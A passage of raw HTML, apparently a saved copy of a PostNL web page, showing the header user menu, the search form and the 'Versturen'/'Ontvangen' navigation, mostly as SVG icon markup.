        <path id=&amp;quot;3s7ef1faga&amp;quot; d=&amp;quot;M12.008 14.218c.28.986 1.2 1.744 2.362 1.744 1.32 0 2.441-1.061 2.441-2.312 0-1.25-1.08-2.312-2.441-2.312-1.121 0-2.082.758-2.362 1.743H8.486c-.24-.91-1.041-1.592-2.002-1.743l-.36-1.175h9.166c.28 0 .48-.152.56-.417l2.122-6.672c.12-.379-.16-.758-.56-.758H5.163c-.04 0-.04.076-.04.114 0 .076.4.758.64.948.16.151.401.113.641.113h10.167L14.89 8.988H5.804L3.202.42c-.08-.265-.32-.417-.6-.417H1.28C1.04.004.8-.034.64.118.44.308 0 .99 0 1.066c0 .037 0 .113.04.113h2.081l3.082 10.31c-.92.341-1.56 1.175-1.56 2.16 0 1.29 1.08 2.351 2.441 2.351 1.2-.038 2.161-.796 2.402-1.782h3.522zm3.642-.568c0 .644-.56 1.175-1.24 1.175-.68 0-1.241-.53-1.241-1.175.04-.644.6-1.175 1.24-1.175.681 0 1.241.53 1.241 1.175zm-9.566 1.137c-.68 0-1.24-.53-1.24-1.175 0-.644.56-1.175 1.24-1.175.72 0 1.24.53 1.24 1.175 0 .644-.56 1.175-1.24 1.175z&amp;quot;></path>
    </defs>
    <g fill=&amp;quot;none&amp;quot; fill-rule=&amp;quot;evenodd&amp;quot;>
        <g>
            <g>
                <g transform=&amp;quot;translate(-798 -664) translate(798 664) translate(2 4)&amp;quot;>
                    <use fill=&amp;quot;currentcolor&amp;quot; xlink:href=&amp;quot;#3s7ef1faga&amp;quot;></use>
                </g>
            </g>
        </g>
    </g>
</svg>
</i><span class=&amp;quot;pci-flyout__link-text&amp;quot;>Bestellingen webshop</span></a></li><li class=&amp;quot;pci-flyout__list-item&amp;quot;><a class=&amp;quot;pci-flyout__link&amp;quot; href=&amp;quot;https://jouw.postnl.nl/account/mijn-cases&amp;quot;><i class=&amp;quot;pci-flyout__icon&amp;quot; aria-hidden=&amp;quot;true&amp;quot;><svg width=&amp;quot;24&amp;quot; height=&amp;quot;24&amp;quot; viewBox=&amp;quot;0 0 24 24&amp;quot; fill=&amp;quot;none&amp;quot; xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot;>
<path fill-rule=&amp;quot;evenodd&amp;quot; clip-rule=&amp;quot;evenodd&amp;quot; d=&amp;quot;M15.1776 14.9658C16.1803 14.9658 17.1387 14.6474 17.9492 14.0454C21.4938 11.4125 19.8953 5.13439 15.1776 5.13439H8.81344C3.67405 5.13439 2.40609 12.3794 6.76684 14.4825C7.59576 14.8815 8.17402 14.9034 8.89562 14.9034C9.20482 14.9034 9.45849 15.1564 9.45849 15.4706V18.9142L12.692 15.1609C12.7989 15.0369 12.9539 14.9658 13.1172 14.9658H15.1776ZM8.81344 4H15.1776C20.9197 4 23.0691 11.6519 18.6168 14.9586C17.6119 15.7054 16.4227 16.1002 15.1776 16.1002H13.3742L9.32077 20.8045C9.21158 20.9308 9.05547 21 8.89562 21C8.82957 21 8.76316 20.9883 8.69899 20.9641C8.47872 20.8813 8.33275 20.6695 8.33275 20.4328V16.0367C7.62165 15.9977 6.9327 15.8196 6.28127 15.5058C0.830421 12.8759 2.51078 4 8.81344 4ZM7.98282 11.2113C8.49031 11.2113 8.90218 10.7939 8.90218 10.2795C8.90218 9.76515 8.49031 9.3477 7.98282 9.3477C7.47534 9.3477 7.06347 9.76515 7.06347 10.2795C7.06347 10.7939 7.47534 11.2113 7.98282 11.2113ZM13.1925 10.2795C13.1925 10.7939 12.7806 11.2113 12.2732 11.2113C11.7657 11.2113 11.3538 10.7939 11.3538 10.2795C11.3538 9.76515 11.7657 9.3477 12.2732 9.3477C12.7806 9.3477 13.1925 9.76515 13.1925 10.2795ZM15.9506 11.2113C16.4581 11.2113 16.8699 10.7939 16.8699 10.2795C16.8699 9.76515 16.4581 9.3477 15.9506 9.3477C15.4431 9.3477 15.0312 9.76515 15.0312 10.2795C15.0312 10.7939 15.4431 11.2113 15.9506 11.2113Z&amp;quot; fill=&amp;quot;currentColor&amp;quot;></path>
<mask id=&amp;quot;mask0_4515_2168&amp;quot; style=&amp;quot;mask-type:luminance&amp;quot; maskUnits=&amp;quot;userSpaceOnUse&amp;quot; x=&amp;quot;3&amp;quot; y=&amp;quot;4&amp;quot; width=&amp;quot;18&amp;quot; height=&amp;quot;17&amp;quot;>
<path fill-rule=&amp;quot;evenodd&amp;quot; clip-rule=&amp;quot;evenodd&amp;quot; d=&amp;quot;M15.1776 14.9658C16.1803 14.9658 17.1387 14.6474 17.9492 14.0454C21.4938 11.4125 19.8953 5.13439 15.1776 5.13439H8.81344C3.67405 5.13439 2.40609 12.3794 6.76684 14.4825C7.59576 14.8815 8.17402 14.9034 8.89562 14.9034C9.20482 14.9034 9.45849 15.1564 9.45849 15.4706V18.9142L12.692 15.1609C12.7989 15.0369 12.9539 14.9658 13.1172 14.9658H15.1776ZM8.81344 4H15.1776C20.9197 4 23.0691 11.6519 18.6168 14.9586C17.6119 15.7054 16.4227 16.1002 15.1776 16.1002H13.3742L9.32077 20.8045C9.21158 20.9308 9.05547 21 8.89562 21C8.82957 21 8.76316 20.9883 8.69899 20.9641C8.47872 20.8813 8.33275 20.6695 8.33275 20.4328V16.0367C7.62165 15.9977 6.9327 15.8196 6.28127 15.5058C0.830421 12.8759 2.51078 4 8.81344 4ZM7.98282 11.2113C8.49031 11.2113 8.90218 10.7939 8.90218 10.2795C8.90218 9.76515 8.49031 9.3477 7.98282 9.3477C7.47534 9.3477 7.06347 9.76515 7.06347 10.2795C7.06347 10.7939 7.47534 11.2113 7.98282 11.2113ZM13.1925 10.2795C13.1925 10.7939 12.7806 11.2113 12.2732 11.2113C11.7657 11.2113 11.3538 10.7939 11.3538 10.2795C11.3538 9.76515 11.7657 9.3477 12.2732 9.3477C12.7806 9.3477 13.1925 9.76515 13.1925 10.2795ZM15.9506 11.2113C16.4581 11.2113 16.8699 10.7939 16.8699 10.2795C16.8699 9.76515 16.4581 9.3477 15.9506 9.3477C15.4431 9.3477 15.0312 9.76515 15.0312 10.2795C15.0312 10.7939 15.4431 11.2113 15.9506 11.2113Z&amp;quot; fill=&amp;quot;white&amp;quot;></path>
</mask>
<g mask=&amp;quot;url(#mask0_4515_2168)&amp;quot;>
</g>
</svg>
</i><span class=&amp;quot;pci-flyout__link-text&amp;quot;>Mijn cases</span></a></li><li class=&amp;quot;pci-flyout__list-item&amp;quot;><a class=&amp;quot;pci-flyout__link&amp;quot; href=&amp;quot;https://jouw.postnl.nl/account/overzicht&amp;quot;><i class=&amp;quot;pci-flyout__icon&amp;quot; aria-hidden=&amp;quot;true&amp;quot;><svg width=&amp;quot;18&amp;quot; height=&amp;quot;18&amp;quot; viewBox=&amp;quot;0 0 18 18&amp;quot; fill=&amp;quot;none&amp;quot; xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot;>
<path fill-rule=&amp;quot;evenodd&amp;quot; clip-rule=&amp;quot;evenodd&amp;quot; d=&amp;quot;M13.0427 14.9522C13.0427 14.9522 12.8008 14.8208 12.5974 14.901C12.3261 15.0074 11.7005 15.5156 11.6715 15.5922C11.6587 15.6257 11.6408 15.7014 11.6719 15.7135L13.0949 16.2681C14.1928 16.6954 16.266 15.3588 15.2724 13.433C14.8227 12.5608 15.1498 12.0102 16.108 11.9671C18.2418 11.8707 18.7272 9.0864 16.7535 8.26173C15.8593 7.8885 15.7535 7.25448 16.463 6.59467C18.0368 5.13196 16.6401 2.68175 14.6058 3.33632C13.6973 3.62774 13.1991 3.22992 13.3253 2.24846C13.6034 0.102964 10.979 -0.864384 9.83498 0.961485C9.31568 1.79018 8.68057 1.78212 8.16366 0.961082C7.01681 -0.857532 4.39163 0.100545 4.67297 2.24806C4.80031 3.21782 4.31443 3.62975 3.39281 3.33632C1.35976 2.69022 -0.042963 5.13277 1.53525 6.59467C2.25113 7.2569 2.13334 7.8885 1.24515 8.26133C-0.722239 9.08962 -0.247104 11.8752 1.89021 11.9667C2.86037 12.0082 3.16798 12.5709 2.72587 13.433C1.74018 15.3532 3.87948 17.1702 5.57151 15.8514C6.33753 15.2536 6.93284 15.4786 7.14176 16.4306C7.61053 18.5636 10.094 18.2415 10.6432 17.1222C10.6609 17.0861 10.6795 17.0507 10.6977 17.0158L10.6977 17.0157C10.7883 16.8425 10.8723 16.6819 10.8227 16.5051C10.7435 16.2214 10.3018 15.5426 10.2293 15.5064C10.1975 15.4902 10.1235 15.4648 10.1088 15.4947C10.1088 15.4947 9.57314 16.5837 9.57394 16.5841C9.43983 16.8574 8.48121 16.9614 8.30731 16.1678C7.90738 14.3488 6.30211 13.7559 4.84328 14.8933C4.17038 15.4173 3.39122 14.7587 3.78517 13.9904C4.62601 12.3512 3.79194 10.8377 1.94035 10.7587C1.09274 10.7228 0.913673 9.71034 1.70278 9.37822C3.37888 8.67366 3.71474 6.97315 2.34067 5.70149C1.71432 5.12229 2.2193 4.23072 3.03467 4.48989C4.78956 5.04933 6.09957 3.93527 5.85643 2.08844C5.74461 1.23678 6.69766 0.881679 7.15688 1.61162C8.15888 3.20089 9.87119 3.16099 10.843 1.6092C11.2978 0.884097 12.2528 1.23315 12.1418 2.09127C11.9046 3.93044 13.2075 5.05538 14.9664 4.48908C15.775 4.22951 16.2855 5.11826 15.656 5.70391C14.2843 6.97798 14.621 8.6785 16.2978 9.37983C17.0822 9.70711 16.9091 10.7204 16.0551 10.7591C14.196 10.8425 13.3738 12.3641 14.2143 13.9933C14.5796 14.701 13.7992 15.248 13.5234 15.1396L13.0427 14.9522ZM8.99932 5.30689C7.03909 5.30689 5.44456 6.92236 5.44456 8.90784C5.44456 10.8933 7.03909 12.5088 8.99932 12.5088C10.9595 12.5088 12.5545 10.8933 12.5545 8.90784C12.5545 6.92236 10.9595 5.30689 8.99932 5.30689ZM6.63837 8.90784C6.63837 10.2267 7.69767 11.2996 8.99932 11.2996C10.3014 11.2996 11.3607 10.2267 11.3607 8.90784C11.3607 7.58903 10.3014 6.51608 8.99932 6.51608C7.69767 6.51608 6.63837 7.58903 6.63837 8.90784Z&amp;quot; fill=&amp;quot;currentColor&amp;quot;></path>
<mask id=&amp;quot;mask0_3636_1158&amp;quot; style=&amp;quot;mask-type:luminance&amp;quot; maskUnits=&amp;quot;userSpaceOnUse&amp;quot; x=&amp;quot;0&amp;quot; y=&amp;quot;0&amp;quot; width=&amp;quot;18&amp;quot; height=&amp;quot;18&amp;quot;>
<path fill-rule=&amp;quot;evenodd&amp;quot; clip-rule=&amp;quot;evenodd&amp;quot; d=&amp;quot;M13.0427 14.9522C13.0427 14.9522 12.8008 14.8208 12.5974 14.901C12.3261 15.0074 11.7005 15.5156 11.6715 15.5922C11.6587 15.6257 11.6408 15.7014 11.6719 15.7135L13.0949 16.2681C14.1928 16.6954 16.266 15.3588 15.2724 13.433C14.8227 12.5608 15.1498 12.0102 16.108 11.9671C18.2418 11.8707 18.7272 9.0864 16.7535 8.26173C15.8593 7.8885 15.7535 7.25448 16.463 6.59467C18.0368 5.13196 16.6401 2.68175 14.6058 3.33632C13.6973 3.62774 13.1991 3.22992 13.3253 2.24846C13.6034 0.102964 10.979 -0.864384 9.83498 0.961485C9.31568 1.79018 8.68057 1.78212 8.16366 0.961082C7.01681 -0.857532 4.39163 0.100545 4.67297 2.24806C4.80031 3.21782 4.31443 3.62975 3.39281 3.33632C1.35976 2.69022 -0.042963 5.13277 1.53525 6.59467C2.25113 7.2569 2.13334 7.8885 1.24515 8.26133C-0.722239 9.08962 -0.247104 11.8752 1.89021 11.9667C2.86037 12.0082 3.16798 12.5709 2.72587 13.433C1.74018 15.3532 3.87948 17.1702 5.57151 15.8514C6.33753 15.2536 6.93284 15.4786 7.14176 16.4306C7.61053 18.5636 10.094 18.2415 10.6432 17.1222C10.6609 17.0861 10.6795 17.0507 10.6977 17.0158L10.6977 17.0157C10.7883 16.8425 10.8723 16.6819 10.8227 16.5051C10.7435 16.2214 10.3018 15.5426 10.2293 15.5064C10.1975 15.4902 10.1235 15.4648 10.1088 15.4947C10.1088 15.4947 9.57314 16.5837 9.57394 16.5841C9.43983 16.8574 8.48121 16.9614 8.30731 16.1678C7.90738 14.3488 6.30211 13.7559 4.84328 14.8933C4.17038 15.4173 3.39122 14.7587 3.78517 13.9904C4.62601 12.3512 3.79194 10.8377 1.94035 10.7587C1.09274 10.7228 0.913673 9.71034 1.70278 9.37822C3.37888 8.67366 3.71474 6.97315 2.34067 5.70149C1.71432 5.12229 2.2193 4.23072 3.03467 4.48989C4.78956 5.04933 6.09957 3.93527 5.85643 2.08844C5.74461 1.23678 6.69766 0.881679 7.15688 1.61162C8.15888 3.20089 9.87119 3.16099 10.843 1.6092C11.2978 0.884097 12.2528 1.23315 12.1418 2.09127C11.9046 3.93044 13.2075 5.05538 14.9664 4.48908C15.775 4.22951 16.2855 5.11826 15.656 5.70391C14.2843 6.97798 14.621 8.6785 16.2978 9.37983C17.0822 9.70711 16.9091 10.7204 16.0551 10.7591C14.196 10.8425 13.3738 12.3641 14.2143 13.9933C14.5796 14.701 13.7992 15.248 13.5234 15.1396L13.0427 14.9522ZM8.99932 5.30689C7.03909 5.30689 5.44456 6.92236 5.44456 8.90784C5.44456 10.8933 7.03909 12.5088 8.99932 12.5088C10.9595 12.5088 12.5545 10.8933 12.5545 8.90784C12.5545 6.92236 10.9595 5.30689 8.99932 5.30689ZM6.63837 8.90784C6.63837 10.2267 7.69767 11.2996 8.99932 11.2996C10.3014 11.2996 11.3607 10.2267 11.3607 8.90784C11.3607 7.58903 10.3014 6.51608 8.99932 6.51608C7.69767 6.51608 6.63837 7.58903 6.63837 8.90784Z&amp;quot; fill=&amp;quot;white&amp;quot;></path>
</mask>
<g mask=&amp;quot;url(#mask0_3636_1158)&amp;quot;>
</g>
</svg>
</i><span class=&amp;quot;pci-flyout__link-text&amp;quot;>Gegevens en voorkeuren</span></a></li><li class=&amp;quot;pci-flyout__list-item&amp;quot;><button class=&amp;quot;pci-button&amp;quot;><span class=&amp;quot;pci-button__text&amp;quot;>Inloggen</span></button></li><li class=&amp;quot;pci-flyout__list-item&amp;quot;><button class=&amp;quot;pci-button pci-button--secondary&amp;quot;><span class=&amp;quot;pci-button__text&amp;quot;>Zakelijk inloggen</span></button></li><li class=&amp;quot;pci-flyout__list-item&amp;quot;><a class=&amp;quot;pci-flyout__link pci-align-menu-item&amp;quot; href=&amp;quot;#&amp;quot;><i class=&amp;quot;pci-flyout__icon&amp;quot; aria-hidden=&amp;quot;true&amp;quot;><svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; width=&amp;quot;16&amp;quot; height=&amp;quot;17&amp;quot; fill=&amp;quot;none&amp;quot;><path fill=&amp;quot;#4E4EE2&amp;quot; fill-rule=&amp;quot;evenodd&amp;quot; d=&amp;quot;m6.216 14.916 5.499-5.654c.377-.389.38-1.005.006-1.398L6.233 2.11a.896.896 0 0 0-1.264-.031l-.03.028a.975.975 0 0 0-.003 1.35l4.863 5.11-4.855 4.98a.964.964 0 0 0-.004 1.343.905.905 0 0 0 1.276.026Z&amp;quot; clip-rule=&amp;quot;evenodd&amp;quot;></path><mask id=&amp;quot;a&amp;quot; width=&amp;quot;8&amp;quot; height=&amp;quot;15&amp;quot; x=&amp;quot;4&amp;quot; y=&amp;quot;1&amp;quot; maskUnits=&amp;quot;userSpaceOnUse&amp;quot; style=&amp;quot;mask-type:luminance&amp;quot;><path fill=&amp;quot;#fff&amp;quot; fill-rule=&amp;quot;evenodd&amp;quot; d=&amp;quot;m6.216 14.916 5.499-5.654c.377-.389.38-1.005.006-1.398L6.233 2.11a.896.896 0 0 0-1.264-.031l-.03.028a.975.975 0 0 0-.003 1.35l4.863 5.11-4.855 4.98a.964.964 0 0 0-.004 1.343.905.905 0 0 0 1.276.026Z&amp;quot; clip-rule=&amp;quot;evenodd&amp;quot;></path></mask></svg></i><span class=&amp;quot;pci-flyout__link-text&amp;quot;>Account aanmaken</span></a></li></ul></div></pnl-user-menu-item-list></nav><iframe title=&amp;quot;User menu consument&amp;quot; hidden=&amp;quot;&amp;quot; src=&amp;quot;index_5.html&amp;quot; data-portal=&amp;quot;identity&amp;quot;></iframe><iframe hidden=&amp;quot;&amp;quot; title=&amp;quot;check session&amp;quot; src=&amp;quot;index_1.html&amp;quot;></iframe></div><style>@font-face{src:url(&amp;quot;&amp;quot;) format(&amp;quot;woff2&amp;quot;);font-family:&amp;quot;ABC-ROM&amp;quot;, Arial, Helvetica, sans-serif}@font-face{src:url(&amp;quot;&amp;quot;) format(&amp;quot;woff2&amp;quot;);font-family:&amp;quot;Hanken Grotesk&amp;quot;, Arial, Helvetica, sans-serif}.is-hidden{position:relative;visibility:hidden;z-index:-1}.is-visible{visibility:visible;position:relative;z-index:1000001}</style>&quot;></pnl-consumer-user-menu></div>"></pnl-user-menu></div><div class="header-mobile__action-buttons" bis_skin_checked="1"><button class="menu-toggle hide-desktop" aria-expanded="false" aria-controls="main-navigation" aria-label="Open menu"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M19.589 7H4.69174H2.12507C2.0478 7 1.95586 6.90106 2.02359 6.75831C2.08779 6.623 2.96852 5.51332 3.47217 5.18729C3.78312 4.98573 4.19678 4.99447 4.64316 5.00391C4.73937 5.00595 4.8371 5.00802 4.93565 5.00802H17.9161H21.8751C22.044 5.00802 21.998 5.14648 21.9823 5.18729C21.9307 5.32199 21.1 6.3785 20.5954 6.70519C20.5826 6.71357 20.5682 6.71975 20.5537 6.72593C20.5419 6.73101 20.53 6.73608 20.5191 6.74237C20.2714 6.90106 19.9475 7 19.589 7ZM4.69174 13H19.589C19.9475 13 20.2714 12.9011 20.5191 12.7424C20.53 12.7361 20.5419 12.731 20.5537 12.7259C20.5682 12.7197 20.5826 12.7136 20.5954 12.7052C21.1 12.3785 21.9307 11.322 21.9823 11.1873C21.998 11.1465 22.044 11.008 21.8751 11.008H17.9161H4.93565C4.83711 11.008 4.73939 11.0059 4.64319 11.0039L4.64316 11.0039C4.19678 10.9945 3.78312 10.9857 3.47217 11.1873C2.96852 11.5133 2.08779 12.623 2.02359 12.7583C1.95586 12.9011 2.0478 13 2.12507 13H4.69174ZM4.69174 19H19.589C19.9475 19 20.2714 18.9011 20.5191 18.7424C20.53 18.7361 20.5419 18.731 20.5537 18.7259C20.5682 18.7197 20.5826 18.7136 20.5954 18.7052C21.1 18.3785 21.9307 17.322 21.9823 17.1873C21.998 17.1465 22.044 17.008 21.8751 17.008H17.9161H4.93565C4.8371 17.008 4.73937 17.0059 4.64316 17.0039H4.64315C4.19677 16.9945 3.78312 16.9857 3.47217 17.1873C2.96852 17.5133 2.08779 18.623 2.02359 18.7583C1.95586 18.9011 2.0478 19 2.12507 19H4.69174Z" fill="currentColor"></path></svg></button></div></div><div class="header-desktop__bottom-right header-desktop__search-slot" bis_skin_checked="1"><span class="search"><form class="pci-search" method="get"><label class="pci-search__label visually-hidden" for="searchquery">Search</label><div class="pci-search__wrapper" bis_skin_checked="1"><input type="text" autocomplete="off" id="header-search-field" name="query" aria-label="Search" role="combobox" aria-autocomplete="list" aria-expanded="false" aria-controls="search-suggestions" class="pci-search__input" placeholder="Zoek naar..." value=""><button class="stamp-button stamp-button--variant-primary stamp-button--size-full pci-search__submit" type="submit"><span class="stamp-button__content"><span class="visually-hidden">Zoek naar...</span><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M10 15.5995C6.912 15.5995 4.4 13.0875 4.4 9.99951C4.4 6.91151 6.912 4.40051 10 4.40051C13.088 4.40051 15.6 6.91151 15.6 9.99951C15.6 13.0875 13.088 15.5995 10 15.5995ZM20.318 19.6705C20.298 19.4255 20.136 19.2165 19.941 19.0225L15.387 14.4675C16.394 13.2555 17 11.6995 17 9.99951C17 6.13351 13.866 2.99951 10 2.99951C6.134 2.99951 3 6.13351 3 9.99951C3 13.8665 6.134 16.9995 10 16.9995C11.699 16.9995 13.256 16.3945 14.468 15.3875L20.007 20.9255C20.034 20.9525 20.077 20.9255 20.103 20.9005C20.166 20.8375 20.344 19.9965 20.318 19.6705Z" fill="currentColor"></path></svg></span></button></div></form></span></div></div></div></header><div class="header-mobile__menu-container hide-desktop is-hidden" bis_skin_checked="1"><div class="search" bis_skin_checked="1"><form class="pci-search" method="get"><label class="pci-search__label visually-hidden" for="searchquery">Search</label><div class="pci-search__wrapper" bis_skin_checked="1"><input type="text" autocomplete="off" id="header-search-field" name="query" aria-label="Search" role="combobox" aria-autocomplete="list" aria-expanded="false" aria-controls="search-suggestions" class="pci-search__input" placeholder="Zoek naar..." value=""><button class="stamp-button stamp-button--variant-primary stamp-button--size-full pci-search__submit" type="submit"><span class="stamp-button__content"><span class="visually-hidden">Zoek naar...</span><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M10 15.5995C6.912 15.5995 4.4 13.0875 4.4 9.99951C4.4 6.91151 6.912 4.40051 10 4.40051C13.088 4.40051 15.6 6.91151 15.6 9.99951C15.6 13.0875 13.088 15.5995 10 15.5995ZM20.318 19.6705C20.298 19.4255 20.136 19.2165 19.941 19.0225L15.387 14.4675C16.394 13.2555 17 11.6995 17 9.99951C17 6.13351 13.866 2.99951 10 2.99951C6.134 2.99951 3 6.13351 3 9.99951C3 13.8665 6.134 16.9995 10 16.9995C11.699 16.9995 13.256 16.3945 14.468 15.3875L20.007 20.9255C20.034 20.9525 20.077 20.9255 20.103 20.9005C20.166 20.8375 20.344 19.9965 20.318 19.6705Z" fill="currentColor"></path></svg></span></button></div></form></div><nav class="main-nav main-nav--consumer" id="desktop-main-navigation" aria-label="Hoofdmenu"><ul class="main-nav__list main-nav__list--lvl-1"><li class="main-nav__item"><div class="main-nav__item-wrapper" bis_skin_checked="1"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" id="menu-item-Versturen" href="https://www.postnl.nl/versturen/"><span class="stamp-link__content">Versturen</span></a><button class="main-nav__trigger stamp-link" aria-expanded="false" aria-controls="menu-item-desktop-main-navigation"><span class="visually-hidden">Open submenu</span><span class="stamp-link__content"><div class="stamp-link__icon stamp-link__icon--end" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.32431 21.624L17.5719 13.1431C18.1388 12.56 18.1432 11.6349 17.5819 11.0464L9.34896 2.41565C8.83858 1.88061 7.98971 1.85929 7.45295 2.36805L7.40983 2.41081C6.8658 2.97545 6.86307 3.86661 7.40362 4.43455L14.699 12.0996L7.41589 19.572C6.87024 20.1318 6.86756 21.0219 7.40983 21.585C7.9277 22.1227 8.78484 22.1402 9.32431 21.624Z" fill="currentColor"></path></svg></div></span></button><div class="main-nav__sublist-wrapper" id="desktop-main-navigation-versturen" bis_skin_checked="1"><button type="button" class="main-nav__button main-nav__button--back"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.6757 21.624L6.42815 13.1431C5.8612 12.56 5.85677 11.6349 6.41809 11.0464L14.651 2.41565C15.1614 1.88061 16.0103 1.85929 16.547 2.36805L16.5902 2.41081C17.1342 2.97545 17.1369 3.86661 16.5964 4.43455L9.30096 12.0996L16.5841 19.572C17.1298 20.1318 17.1324 21.0219 16.5902 21.585C16.0723 22.1227 15.2152 22.1402 14.6757 21.624Z" fill="currentColor"></path></svg>Terug naar overzicht</button><h2 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle main-nav__sublist-title">Versturen</h2><ul class="main-nav__sublist main-nav__sublist--default"><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/versturen/pakket-versturen/"><span class="stamp-link__content">Pakket versturen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/versturen/brief-of-kaart-versturen/"><span class="stamp-link__content">Brief of kaart versturen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/versturen/postzegels/"><span class="stamp-link__content">Postzegels</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li></ul><ul class="main-nav__sublist main-nav__sublist--illustrated"><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/tarieven/?productCountry=NL&amp;weight=0-2000&amp;product=pakket"><span class="stamp-link__content">Tarieven</span></a><img aria-hidden="true" src="tarieven.png" class="main-nav__image" alt="Tarieven" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://jouw.postnl.nl/online-versturen/?pst=sp-pnl-nav-verz-ql2-versturen"><span class="stamp-link__content">Online frankeren</span></a><img aria-hidden="true" src="pakket_postzegelcode.png" class="main-nav__image" alt="Online frankeren" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/postzegels/?pst=sp-pnl-nav-verz-ql3-shop-zegels"><span class="stamp-link__content">Postzegels kopen</span></a><img aria-hidden="true" src="postzegels-kopen_tcm10-89036.png" class="main-nav__image" alt="Postzegels kopen" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/locatiewijzer/"><span class="stamp-link__content">PostNL-punten</span></a><img aria-hidden="true" src="postnl-locaties_tcm10-89034.png" class="main-nav__image" alt="PostNL-punten" loading="lazy"></li></ul></div></div></li><li class="main-nav__item"><div class="main-nav__item-wrapper" bis_skin_checked="1"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" id="menu-item-Ontvangen" href="https://www.postnl.nl/ontvangen/"><span class="stamp-link__content">Ontvangen</span></a><button class="main-nav__trigger stamp-link" aria-expanded="false" aria-controls="menu-item-desktop-main-navigation"><span class="visually-hidden">Open submenu</span><span class="stamp-link__content"><div class="stamp-link__icon stamp-link__icon--end" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.32431 21.624L17.5719 13.1431C18.1388 12.56 18.1432 11.6349 17.5819 11.0464L9.34896 2.41565C8.83858 1.88061 7.98971 1.85929 7.45295 2.36805L7.40983 2.41081C6.8658 2.97545 6.86307 3.86661 7.40362 4.43455L14.699 12.0996L7.41589 19.572C6.87024 20.1318 6.86756 21.0219 7.40983 21.585C7.9277 22.1227 8.78484 22.1402 9.32431 21.624Z" fill="currentColor"></path></svg></div></span></button><div class="main-nav__sublist-wrapper" id="desktop-main-navigation-ontvangen" bis_skin_checked="1"><button type="button" class="main-nav__button main-nav__button--back"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.6757 21.624L6.42815 13.1431C5.8612 12.56 5.85677 11.6349 6.41809 11.0464L14.651 2.41565C15.1614 1.88061 16.0103 1.85929 16.547 2.36805L16.5902 2.41081C17.1342 2.97545 17.1369 3.86661 16.5964 4.43455L9.30096 12.0996L16.5841 19.572C17.1298 20.1318 17.1324 21.0219 16.5902 21.585C16.0723 22.1227 15.2152 22.1402 14.6757 21.624Z" 